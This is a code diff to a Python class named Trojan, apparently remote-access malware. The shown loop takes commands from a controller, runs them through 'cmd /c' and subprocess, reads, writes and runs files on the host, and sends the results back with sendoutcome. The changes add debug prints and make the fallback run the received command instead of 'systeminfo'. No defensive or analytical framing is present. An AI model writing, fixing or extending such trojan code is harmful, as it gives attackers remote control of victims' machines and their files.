@@ -48,13 +48,15 @@ class Trojan:
         |file-run- run files on computer- input is [*files], output is [*[file name, errors]]
         """
         commands = self.commands()
+        print(commands)
         outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
+        print(commands)
         for key, values in commands.items():
             if key.lower() == 'cmd':
                 for cmd in values: #just keeps running seemingly random values
                     output = os.system('cmd /c "%s"'% cmd) 
                     if output == -1 or output == 1:
-                        output = subprocess.check_output(shlex.split("systeminfo"), stderr=subprocess.STDOUT)
+                        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
                     outcomes['cmd'].append([ cmd, output])
             elif key.lower() == 'file-read':
                 for value in values:
@@ -87,6 +89,7 @@ class Trojan:
                     else:
                         errors += '\n\n[*] Invalid file type\n\n'
                     outcomes['file-run'].append([value, errors])
+        print('sent outcome')
         self.sendoutcome(outcomes)
                     
                     
